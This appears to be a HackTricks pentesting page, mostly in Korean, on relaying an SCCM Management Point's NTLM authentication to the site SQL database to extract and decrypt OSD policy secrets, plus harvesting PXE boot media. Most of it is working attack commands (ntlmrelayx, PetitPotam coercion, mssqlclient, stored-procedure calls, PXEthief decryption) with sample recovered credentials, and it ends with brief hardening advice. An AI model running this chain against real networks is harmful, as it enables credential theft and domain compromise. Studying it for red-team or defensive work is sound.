# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
SMB/RPC로 인증하도록 **System Center Configuration Manager (SCCM) Management Point (MP)**를 강제하고 해당 NTLM 머신 계정을 **사이트 데이터베이스 (MSSQL)**로 **릴레이(relay)**하면 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 권한을 얻을 수 있습니다. 이 역할로 저장 프로시저 집합을 호출하면 **Operating System Deployment (OSD)** 정책 블롭(예: Network Access Account 자격증명, Task-Sequence 변수 등)을 노출합니다. 블롭은 16진수로 인코딩/암호화되어 있지만 **PXEthief**로 디코드·복호화하여 평문 비밀을 얻을 수 있습니다.

전체 흐름:
1. MP와 사이트 DB 발견 ↦ 인증이 필요 없는 HTTP 엔드포인트 `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` 실행.
3. **PetitPotam**, PrinterBug, DFSCoerce 등으로 MP 강제 인증.
4. SOCKS 프록시를 통해 리레이된 **<DOMAIN>\\<MP-host>$** 계정으로 `mssqlclient.py -windows-auth`로 연결.
5. 실행:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (또는 `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM 제거, `xxd -r -p` → XML → `python3 pxethief.py 7 <hex>`.

PXE나 클라이언트에 접근하지 않고도 `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` 등과 같은 비밀을 회수할 수 있습니다.

---

## 1. 인증이 필요 없는 MP 엔드포인트 나열
MP ISAPI 확장 **GetAuth.dll**은(는) 몇몇 파라미터를 노출하며(사이트가 PKI 전용인 경우 제외) 인증을 요구하지 않습니다:

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | 사이트 서명 인증서의 공개 키 + *x86* / *x64* **All Unknown Computers** 디바이스의 GUID들을 반환합니다. |
| `MPLIST` | 사이트 내 모든 Management-Point를 나열합니다. |
| `SITESIGNCERT` | Primary-Site 서명 인증서를 반환합니다 (LDAP 없이 사이트 서버를 식별할 때 사용). |

나중에 DB 쿼리에서 **clientID**로 사용할 GUID들을 가져옵니다:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---
  
## 2. MP 머신 계정을 MSSQL로 Relay
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
강제 실행이 발생하면 다음과 같은 항목이 표시됩니다:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. 저장 프로시저를 통해 OSD 정책 식별
SOCKS 프록시(기본 포트 1080)를 통해 연결:
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB로 전환하세요 (3자리 사이트 코드를 사용하세요, 예: `CM_001`).

### 3.1  Unknown-Computer GUIDs 찾기 (선택사항)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  할당된 정책 나열
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
각 행에는 `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`가 포함되어 있습니다.

Focus on policies:
* **NAAConfig**  – Network Access Account 자격 증명
* **TS_Sequence** – Task Sequence 변수 (OSDJoinAccount/Password)
* **CollectionSettings** – run-as 계정을 포함할 수 있음

### 3.3  전체 `Body` 가져오기
이미 `PolicyID` & `PolicyVersion`이 있는 경우 다음을 사용하면 clientID 요구 사항을 건너뛸 수 있습니다:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> 중요: SSMS에서 “Maximum Characters Retrieved” (>65535) 이상으로 늘리세요. 그렇지 않으면 blob이 잘립니다.

---

## 4. blob 디코딩 및 복호화
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
복구된 비밀 예시:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. 관련 SQL 역할 및 절차
릴레이 시 로그인은 다음 역할에 매핑됩니다:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

이 역할들은 수십 개의 EXEC 권한을 노출하며, 이 공격에서 사용되는 주요 권한은 다음과 같습니다:

| 저장 프로시저 | 용도 |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | `clientID`에 적용된 정책을 나열합니다. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 전체 정책 본문을 반환합니다. |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` 경로에 의해 반환됩니다. |

전체 목록은 다음으로 확인할 수 있습니다:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE 부팅 미디어 수집 (SharpPXE)
* **PXE reply over UDP/4011**: PXE에 구성된 Distribution Point로 PXE 부트 요청을 전송합니다. proxyDHCP 응답은 `SMSBoot\\x64\\pxe\\variables.dat` (암호화된 구성) 및 `SMSBoot\\x64\\pxe\\boot.bcd`와 같은 부트 경로와 선택적인 암호화된 키 블롭을 드러냅니다.
* **Retrieve boot artifacts via TFTP**: 반환된 경로를 사용해 TFTP(인증 없음)로 `variables.dat`를 다운로드합니다. 파일은 작고(몇 KB) 암호화된 미디어 변수들을 포함합니다.
* **Decrypt or crack**:
- 응답에 복호화 키가 포함되어 있으면, **SharpPXE**에 전달해 `variables.dat`를 직접 복호화합니다.
- 키가 제공되지 않으면(사용자 지정 암호로 보호된 PXE 미디어), SharpPXE는 오프라인 크래킹을 위해 **Hashcat-compatible** `$sccm$aes128$...` 해시를 생성합니다. 비밀번호를 복구한 후 파일을 복호화합니다.
* **Parse decrypted XML**: 평문 변수에는 SCCM 배포 메타데이터(**Management Point URL**, **Site Code**, 미디어 GUID 및 기타 식별자)가 포함됩니다. SharpPXE는 이를 파싱하여 GUID/PFX/site 매개변수가 미리 채워진 실행 준비된 **SharpSCCM** 명령을 출력해 후속 악용에 사용할 수 있게 합니다.
* **Requirements**: PXE 리스너(UDP/4011)와 TFTP에 대한 네트워크 도달성만 필요하며, 로컬 관리자 권한은 필요하지 않습니다.

---

## 7. 탐지 및 강화
1. **Monitor MP logins** – 호스트가 아닌 IP에서 로그인하는 모든 MP 컴퓨터 계정 ≈ 중계(relay).
2. 사이트 데이터베이스에서 **Extended Protection for Authentication (EPA)**를 활성화합니다 (`PREVENT-14`).
3. 사용하지 않는 NTLM 비활성화, SMB 서명 적용, RPC 제한( `PetitPotam`/`PrinterBug`에 대한 동일한 완화책).
4. MP ↔ DB 통신을 IPSec / mutual-TLS로 강화합니다.
5. **Constrain PXE exposure** – UDP/4011 및 TFTP를 신뢰된 VLAN으로만 방화벽 설정하고, PXE 암호를 요구하며, `SMSBoot\\*\\pxe\\variables.dat`의 TFTP 다운로드에 대해 경고를 발생시킵니다.

---

## 관련
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## 참고 문헌
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
